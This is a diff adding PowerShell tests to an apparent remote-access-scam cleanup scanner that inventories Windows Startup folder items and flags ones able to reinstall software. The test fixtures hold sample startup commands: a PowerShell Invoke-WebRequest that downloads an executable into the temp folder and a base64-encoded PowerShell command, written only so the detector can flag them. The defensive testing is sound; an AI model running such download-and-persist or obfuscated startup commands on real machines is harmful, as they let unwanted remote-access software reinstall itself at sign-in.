@@ -57,6 +57,8 @@ Assert-True ($moduleSource -match 'TaskPath\s*= \$task\.TaskPath' -and $moduleSo
 Assert-True ($moduleSource -notmatch "HeuristicReason\s*=\s*'Recent unsigned or invalidly signed executable") 'Unsigned Temp files alone are not treated as remote-access removal candidates'
 Assert-True ($moduleSource -match '\$displayVersion\s*=\s*Get-CompuTekPropertyValue \$p ''DisplayVersion''' -and $moduleSource -match 'DisplayVersion\s+=\s+\$Artifact\.DisplayVersion') 'Installed-program versions are retained in findings for version-aware grouping'
 Assert-True ($moduleSource -match '\$actionableMatches\s*=\s*@\(\$matches \| Where-Object \{\$_.Product.category -ne ''native-feature''\}\)' -and $moduleSource -match 'Post-Scam event evidence handles') 'Ordinary built-in Windows remote features are excluded from removal findings'
+Assert-True ($moduleSource -match 'Get-CompuTekStartupCommandInfo' -and $moduleSource -match 'StartupReinstallRisk' -and $moduleSource -match '\.StartupItems\.csv') 'Every Startup folder item is inventoried and reinstall-capable commands are preserved in separate reports'
+Assert-True ($remediationSource -match 'Remove-CandidateStartupItems' -and $remediationSource -match 'startup-folder reinstall item' -and $remediationSource -match 'RemainingStartupItems' -and $remediationSource -match 'After-remediation startup inventory') 'Approved Startup relaunch items are quarantined before uninstall and checked by the follow-up scan'
 
 $singleEndpointArtifacts = @(& $scannerModule {
     function Get-CimInstance {
@@ -91,6 +93,42 @@ try {
     $resolvedTraversalRoot = [IO.Path]::GetFullPath($traversalRoot)
     if ($resolvedTraversalRoot.StartsWith($artifactRoot + [IO.Path]::DirectorySeparatorChar,[StringComparison]::OrdinalIgnoreCase) -and (Test-Path -LiteralPath $resolvedTraversalRoot)) {
         Remove-Item -LiteralPath $resolvedTraversalRoot -Recurse -Force
+    }
+}
+
+$startupTestRoot = Join-Path $artifactRoot ('StartupInspectionTest-' + [Guid]::NewGuid().ToString('N'))
+try {
+    New-Item -Path $startupTestRoot -ItemType Directory -Force | Out-Null
+    $reinstallerPath = Join-Path $startupTestRoot 'SupportAgentUpdate.cmd'
+    $benignPath = Join-Path $startupTestRoot 'OpenNotes.cmd'
+    $encodedPath = Join-Path $startupTestRoot 'EncodedUpdate.cmd'
+    Set-Content -LiteralPath $reinstallerPath -Value 'powershell.exe -NoProfile -Command "Invoke-WebRequest https://example.invalid/SupportAgentSetup.exe -OutFile $env:TEMP\SupportAgentSetup.exe"' -Encoding ASCII
+    Set-Content -LiteralPath $benignPath -Value 'notepad.exe' -Encoding ASCII
+    Set-Content -LiteralPath $encodedPath -Value 'powershell.exe -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==' -Encoding ASCII
+    $reinstallerInfo = Get-CompuTekStartupCommandInfo -File (Get-Item -LiteralPath $reinstallerPath)
+    $benignInfo = Get-CompuTekStartupCommandInfo -File (Get-Item -LiteralPath $benignPath)
+    $encodedInfo = Get-CompuTekStartupCommandInfo -File (Get-Item -LiteralPath $encodedPath)
+    Assert-True ($reinstallerInfo.ReinstallRisk -and $reinstallerInfo.AnalysisText -match 'Invoke-WebRequest') 'A Startup script that redownloads an agent is marked as a reinstall risk'
+    Assert-True (-not $benignInfo.ReinstallRisk) 'A benign Startup script is inventoried without being flagged as a reinstall risk'
+    Assert-True $encodedInfo.ReinstallRisk 'An encoded PowerShell command in Startup is marked for technician review'
+
+    $startupReportDirectory = Join-Path $startupTestRoot 'Report'
+    $syntheticStartup = [pscustomobject]@{
+        Name='SupportAgentUpdate.cmd';SourcePath=$reinstallerPath;StartupTarget=$reinstallerPath;StartupArguments=''
+        StartupReinstallRisk=$true;HeuristicReason='Startup folder item can download or reinstall software at sign-in'
+        CommandLine=$reinstallerInfo.AnalysisText;LastWriteTimeUtc=(Get-Date).ToUniversalTime();OriginalFilename=$null
+        CompanyName=$null;Signer=$null;SignatureStatus='Unknown'
+    }
+    $syntheticScan = [pscustomobject]@{Findings=@();StartupInventory=@($syntheticStartup)}
+    $startupReport = Export-CompuTekScanReport -Scan $syntheticScan -Directory $startupReportDirectory -BaseName 'StartupTest'
+    Assert-True ((Test-Path -LiteralPath $startupReport.StartupJson) -and (Test-Path -LiteralPath $startupReport.StartupCsv) -and ((Get-Content -LiteralPath $startupReport.StartupCsv -Raw) -match 'SupportAgentUpdate\.cmd')) 'Startup inventory JSON and CSV reports retain the exact Startup item'
+
+    $emptyStartupReport = Export-CompuTekScanReport -Scan ([pscustomobject]@{Findings=@();StartupInventory=@()}) -Directory $startupReportDirectory -BaseName 'EmptyStartupTest'
+    Assert-True ((Test-Path -LiteralPath $emptyStartupReport.StartupCsv) -and ((Get-Content -LiteralPath $emptyStartupReport.StartupCsv -Raw) -match 'StartupReinstallRisk')) 'An empty Startup inventory still produces a readable CSV with column headings'
+} finally {
+    $resolvedStartupTestRoot = [IO.Path]::GetFullPath($startupTestRoot)
+    if ($resolvedStartupTestRoot.StartsWith($artifactRoot + [IO.Path]::DirectorySeparatorChar,[StringComparison]::OrdinalIgnoreCase) -and (Test-Path -LiteralPath $resolvedStartupTestRoot)) {
+        Remove-Item -LiteralPath $resolvedStartupTestRoot -Recurse -Force
     }
 }
 
